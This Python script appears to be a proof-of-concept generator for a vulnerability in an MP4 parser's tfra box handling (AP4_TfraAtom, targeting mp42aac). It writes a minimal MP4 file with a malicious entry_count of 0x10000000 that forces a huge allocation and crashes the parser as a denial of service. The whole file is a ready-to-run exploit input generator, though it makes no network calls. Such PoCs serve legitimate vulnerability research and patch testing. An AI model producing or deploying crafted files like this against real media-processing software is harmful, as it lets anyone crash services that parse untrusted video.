#!/usr/bin/env python3
"""
VULN 006 PoC Generator — AP4_TfraAtom Unchecked entry_count
Triggers huge allocation via SetItemCount(0x10000000) → bad_alloc / DoS
"""
import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_006.mp4")


def box(box_type: bytes, payload: bytes) -> bytes:
    """Return a full box: 4B size (BE) + 4B type + payload."""
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def make_ftyp() -> bytes:
    """Minimal ftyp box: major_brand=isom, minor_version=0, compatible=[isom]"""
    payload = b"isom" + struct.pack(">I", 0) + b"isom"
    return box(b"ftyp", payload)


def make_mvhd() -> bytes:
    """Minimal mvhd (version=0) so moov is structurally present."""
    # version=0, flags=0
    # creation_time, modification_time, timescale, duration (all 4B for v0)
    # rate=1.0, volume=1.0, reserved, matrix, pre_defined, next_track_id
    payload = (
        struct.pack(">I", 0)       # version(1)+flags(3) = 0
        + struct.pack(">I", 0)     # creation_time
        + struct.pack(">I", 0)     # modification_time
        + struct.pack(">I", 1000)  # timescale
        + struct.pack(">I", 0)     # duration
        + struct.pack(">I", 0x00010000)  # rate = 1.0
        + struct.pack(">H", 0x0100)     # volume = 1.0
        + b"\x00" * 10            # reserved
        # Unity matrix (9 x 4B)
        + struct.pack(">9I",
                      0x00010000, 0, 0,
                      0, 0x00010000, 0,
                      0, 0, 0x40000000)
        + b"\x00" * 24            # pre_defined
        + struct.pack(">I", 2)    # next_track_id
    )
    return box(b"mvhd", payload)


def make_moov() -> bytes:
    """Minimal moov box containing only mvhd."""
    return box(b"moov", make_mvhd())


def make_tfra() -> bytes:
    """
    Malicious tfra box:
      version=0, flags=0
      track_id=1
      lengths_byte=0x00000000  (traf_number/trun_number/sample_number each 1 byte)
      entry_count=0x10000000   <-- triggers SetItemCount(0x10000000) → huge alloc
      (no actual entry data — parser should crash before reading entries)
    """
    payload = (
        b"\x00"                          # version = 0
        + b"\x00\x00\x00"               # flags = 0
        + struct.pack(">I", 1)           # track_id = 1
        + struct.pack(">I", 0x00000000)  # lengths_byte (all sizes = 1)
        + struct.pack(">I", 0x10000000)  # entry_count = 268435456 — the trigger
        # No entry bytes — box ends here; parser allocates before reading entries
    )
    return box(b"tfra", payload)


def make_mfro(mfra_size: int) -> bytes:
    """mfro box (16 bytes total): records size of enclosing mfra."""
    payload = struct.pack(">I", mfra_size)
    return box(b"mfro", payload)


def make_mfra() -> bytes:
    """mfra box containing tfra + mfro."""
    tfra = make_tfra()
    # mfro records the total mfra size; build it with a placeholder first
    # mfra = 8 (header) + len(tfra) + 16 (mfro)
    mfra_size = 8 + len(tfra) + 16
    mfro = make_mfro(mfra_size)
    return box(b"mfra", tfra + mfro)


def main():
    ftyp = make_ftyp()
    moov = make_moov()
    mfra = make_mfra()

    data = ftyp + moov + mfra

    with open(OUT_FILE, "wb") as f:
        f.write(data)

    print(f"[+] Written {len(data)} bytes to {OUT_FILE}")
    print(f"    tfra entry_count = 0x10000000 ({0x10000000} entries)")
    print(f"    Expected: bad_alloc / abort when mp42aac parses mfra/tfra")


if __name__ == "__main__":
    main()
